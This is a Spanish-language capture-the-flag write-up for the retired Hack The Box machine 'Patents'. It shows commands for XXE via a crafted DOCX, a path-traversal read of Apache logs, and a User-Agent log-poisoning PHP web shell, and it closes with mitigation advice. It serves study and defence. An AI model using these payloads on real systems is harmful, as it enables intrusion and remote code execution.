---
machine: Patents
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xxe, libreoffice, log-poisoning, docker, reversing]
---

# Patents — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La aplicación convierte documentos DOCX a PDF con LibreOffice y es vulnerable a XXE, lo que permite leer su configuración y descubrir otra sección. Un traversal con envenenamiento de logs da ejecución en el contenedor web; la contraseña de root aparece en la lista de procesos y un servicio binario del host se revierte para escapar.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000,5000 <IP>
```

- Puertos: `22/tcp` SSH, `80/tcp` HTTP y servicios internos de la aplicación.
- Servicios: Portal de patentes, conversor LibreOffice y un servicio binario personalizado.
- Tecnologías: PHP, LibreOffice, Docker, logs de Apache y binario ELF.

## Enumeración

- `patents.htb` con subida de DOCX.
- Conversión a PDF mediante LibreOffice.
- Vhost o ruta adicional descubierta en la configuración.
- Contenedor web con montaje del host y servicio binario.

## Foothold

Se crea un DOCX con una entidad externa en los metadatos; LibreOffice la resuelve al convertir y el PDF refleja el archivo leído. Con la configuración se localiza una ruta vulnerable a traversal, se envenena el log de Apache y se ejecuta PHP en el contenedor.

```bash
# DOCX con XXE en document.xml o metadatos
python3 make_xxe_docx.py file:///var/www/html/config.php
curl -s -F "file=@payload.docx" http://patents.htb/convert.php
curl -s "http://patents.htb/download.php?file=../../../../var/log/apache2/access.log"
curl -A '<?php system($_GET["c"]); ?>' http://patents.htb/
```

## Movimiento lateral

La shell del contenedor permite leer la configuración y localizar el servicio del host. La contraseña de root se encuentra en la lista de procesos y se reutiliza para el siguiente salto.

## Escalada de privilegios

El servicio binario del host se comunica con la aplicación y se puede revertir. Se identifica la validación débil o el comando invocado y se construye un payload que ejecuta una shell como root en el host.

```bash
ps auxww
cat /proc/<PID>/cmdline
# Extraer el binario del servicio y analizarlo
ghidra
# Enviar el payload al puerto interno del servicio
```

## Evidencia

- DOCX con XXE y configuración leída.
- Ejecución de PHP tras el log poisoning.
- Contraseña en procesos y shell de root en el host.

## Lecciones aprendidas

- LibreOffice es un parser complejo y también una superficie XXE.
- Los logs escribibles convierten un traversal en RCE.
- Los secretos en líneas de comandos quedan expuestos en `/proc`.

## Mitigación y detección

- Deshabilitar entidades externas y macros en LibreOffice; aislar el conversor.
- No permitir traversal ni escritura en logs desde la aplicación.
- Pasar secretos por variables de entorno o ficheros protegidos, no por argumentos.

## Referencias

- [0xdf — Patents](https://0xdf.gitlab.io/2020/05/16/htb-patents.html)
- [IppSec — Patents](https://www.youtube.com/watch?v=XqsURG_agvY)
- [Hack The Box — Patents](https://app.hackthebox.com/machines/patents)
